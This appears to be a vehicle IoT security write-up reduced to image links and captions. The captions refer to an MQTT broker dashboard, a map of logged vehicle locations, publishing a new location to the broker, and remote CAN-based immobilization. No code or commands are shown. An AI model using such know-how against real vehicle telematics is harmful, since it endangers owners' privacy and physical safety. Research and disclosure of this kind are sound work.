![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FlPlZKoR0yxOXaLwF7ewT%252Fimage.png%3Falt%3Dmedia%26token%3D5997eefb-73af-4e1e-bd9c-cae7b1d6c02c&width=768&dpr=4&quality=100&sign=b926c743&sv=2)

<https://www.csselectronics.com/pages/can-bus-simple-intro-tutorial>

![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FFI04JyeByg2qY7SQbGBx%252FScreenshot%2520from%25202023-08-22%252016-26-20.png%3Falt%3Dmedia%26token%3Dec432d2b-3341-4fc2-bcdb-6ac0645a8cd5&width=768&dpr=4&quality=100&sign=37711dc&sv=2)

MQTT Broker Dashboard running on port 8081

![https://ayyappan.me/logged-vehicles-map.html](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FcYzitNdgcZPI6jExJJUu%252FScreenshot%2520from%25202023-10-11%252011-54-01.png%3Falt%3Dmedia%26token%3D3f6238df-4f79-4d5d-b600-8628b7e9d137&width=768&dpr=4&quality=100&sign=d14721e7&sv=2)

Map of all logged locations

![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FnulDOFAa9LLWrFODzoFv%252Fimage.png%3Falt%3Dmedia%26token%3D399a467c-5976-4e08-bf40-0544c3f918a1&width=768&dpr=4&quality=100&sign=6839500c&sv=2)

Location found in the payload

![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252F0j9phmhCb9u230xM0eda%252FTEMP.png%3Falt%3Dmedia%26token%3Dfda12a97-8a44-4832-b385-ff17b1efe556&width=768&dpr=4&quality=100&sign=8e302579&sv=2)

Screenshot of subscribing and publishing on the MQTT broker

![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FDWUIsz6uxNa32cyoWgEp%252Fimage.png%3Falt%3Dmedia%26token%3D4629853c-2af0-4c11-9dbe-7519ebc6a034&width=768&dpr=4&quality=100&sign=7b72ec50&sv=2)

New location

![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FEtjsxEkhcmgbTbROy5II%252Fimage.png%3Falt%3Dmedia%26token%3Da98ef09b-4f25-4d34-94ce-2ed69559f752&width=768&dpr=4&quality=100&sign=9882be45&sv=2)

Tor IoT feature for remote CAN based immobilization


